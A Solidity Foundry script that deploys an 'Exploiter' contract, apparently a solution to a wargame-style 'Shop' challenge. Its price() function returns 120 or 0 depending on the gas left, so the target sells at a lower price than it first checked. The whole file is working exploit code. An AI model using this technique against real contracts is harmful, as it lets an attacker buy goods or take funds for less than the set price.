// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract Deployer is Script {
    function run() external {
        vm.startBroadcast();
        new Exploiter();
        vm.stopBroadcast();
    }
}

contract Exploiter {
    uint256 public constant GAS_USED = 5e4;

    uint256 public gasLimit;    

    function exploit(address _shop) external {
        gasLimit = _gasLimit();
        IShop(_shop).buy();
    }

    function _gasLimit() internal view returns (uint256 limit) {
        limit = (((gasleft() * 63) / 64) * 63) / 64;
    }

    function price() external view returns (uint256) {
        if (gasleft() + GAS_USED < gasLimit) return 0;
        return 120;
    }
}

interface IShop {
    function buy() external;
}